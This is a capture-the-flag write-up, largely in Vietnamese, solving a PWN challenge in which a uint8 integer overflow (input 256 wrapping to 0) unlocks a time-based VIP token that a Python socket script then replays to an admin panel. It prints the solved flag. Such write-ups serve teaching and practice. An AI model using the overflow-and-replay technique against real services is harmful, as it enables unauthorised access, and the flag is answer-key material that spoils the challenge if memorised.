# Writeup: PWN CHALLENGE 4 (VinAI API Token Counter)

> **Event:** DDC CTF  
> **Category:** PWN  
> **Difficulty:** Easy  
> **Points:** 70  
> **Description:** *"The Free Tier Is Guarded by a Counter That Is Also Very Small and Very Sincere."*  
> **Flag:** `flag{da936d94-f4ca-4fbf-b363-6aadfca105ed}`

---

## 1. Tóm tắt (TL;DR)

1. Dịch vụ **VinAI API Token Counter** cho phép yêu cầu tối đa 100 tokens (free tier) và có admin panel yêu cầu VIP token.
2. Gửi `0` tokens sẽ kích hoạt "Unlimited mode" và phát hành VIP token. Tuy nhiên, server check `amount > 100` trước.
3. **Lỗ hổng**: Counter sử dụng kiểu `uint8` (unsigned 8-bit integer, phạm vi 0–255). Khi nhập `256`, giá trị bị **integer overflow** wrap về `0`, bypass check giới hạn 100.
4. VIP token là **time-based** và hợp lệ rất ngắn (khoảng 1 giây).
5. Lấy VIP token rồi **ngay lập tức** kết nối lại và submit vào admin panel trong cùng giây.
6. Nhận flag: `flag{da936d94-f4ca-4fbf-b363-6aadfca105ed}`

---

## 2. Phân tích chi tiết

### Bước 1: Khảo sát dịch vụ

```
$ nc 172.31.102.101 10053
=================================
 VinAI API Token Counter
=================================
Free tier: 100 tokens/request

Choose option:
  1. Request tokens
  2. Admin panel
>
```

- **Option 1**: Nhập số tokens cần dùng. Nếu `> 100` → bị chặn. Nếu `== 0` → "Unlimited mode unlocked!" + phát VIP token.
- **Option 2**: Nhập VIP token để vào admin panel lấy flag.

### Bước 2: Phát hiện lỗ hổng uint8 overflow

Hint: *"Counter That Is Also Very Small"* → counter dùng kiểu dữ liệu rất nhỏ.

Thử nghiệm các giá trị:

| Input | Kết quả | Giải thích |
|-------|---------|------------|
| `50`  | "Tokens used: 50" | Bình thường |
| `100` | "Tokens used: 100" | Tối đa free tier |
| `101` | "Exceeded free tier limit!" | Bị chặn |
| `-1`  | "Exceeded free tier limit!" | Bị chặn (signed → unsigned cast) |
| `0`   | "Unlimited mode unlocked!" | Trigger VIP token |
| `256` | "Processing 0 tokens... Unlimited mode!" | **Integer overflow!** |

Khi nhập `256`, giá trị `uint8` wrap: `256 % 256 = 0`. Server check `if (amount > 100)` trước khi truncate → `256 > 100` là true? Không! Check dùng uint8 nên `256` đã bị truncate thành `0` trước khi so sánh. Kết quả: bypass thành công.

### Bước 3: Phân tích VIP token

Token có dạng `VIP-XXXXXXXX` (hex 32-bit). Phân tích cho thấy giá trị giảm khoảng 1–2 mỗi giây → **time-based token**. Token chỉ hợp lệ trong cửa sổ thời gian rất ngắn (≈1 giây).

```
time=1789798784  token=VIP-B403976D
time=1789798786  token=VIP-B403976C  (delta=-1)
time=1789798788  token=VIP-B403976A  (delta=-2)
```

### Bước 4: Khai thác

Cần lấy token và submit **trong cùng giây**:

```python
# Step 1: Get VIP token
s1 = socket.socket()
s1.connect((HOST, PORT))
s1.sendall(b'1\n256\n')  # uint8 overflow → 0 → unlimited mode
token = extract_token(s1.recv(...))
s1.close()

# Step 2: Submit immediately (within same second)
s2 = socket.socket()
s2.connect((HOST, PORT))
s2.sendall(b'2\n')
s2.sendall(token + b'\n')
# → flag!
```

Kết quả:
```
✓ Token verified!
Your secret flag: flag{da936d94-f4ca-4fbf-b363-6aadfca105ed}
```

---

## 3. Script giải tự động

Xem [solve_pwn4_new.py](file:///c:/Users/ACER/Downloads/ctf/ddcriel/solve_pwn4_new.py)

```bash
python solve_pwn4_new.py 172.31.102.101 10053
```

Script thực hiện retry tối đa 10 lần do race condition với token time-based.
